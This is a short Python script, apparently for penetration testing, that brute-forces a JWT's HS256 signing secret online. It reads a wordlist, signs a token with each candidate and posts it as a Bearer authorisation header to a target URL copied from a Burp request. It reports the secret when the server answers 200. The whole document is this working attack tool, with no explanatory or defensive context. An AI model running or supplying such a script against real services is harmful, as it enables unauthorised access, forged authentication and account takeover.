import requests
import jwt

wl = open('wordlist.txt')
wl = wl.read().split('\n')
     
for secret in wl:

    encoded = jwt.encode({"bla" : "blabla"}, '{s}'.format(s=secret), algorithm='HS256')
    req = str(encoded)
    tkn = "Bearer {t}".format(t=req[2:-1])

    burp0_url = 'URL'
    burp0_headers = HEADER
    burp0_headers['authorization'] = tkn

    r = requests.post(burp0_url, headers=burp0_headers)
    print('{s} > {r}'.format(s=secret,r=r.status_code))
    if r.status_code == 200:
        print('\nSECRET FOUND')
        print('')
        print('Token JWT: {t}'.format(t=tkn))
        exit(0)

print('Secret NOT FOUND!')
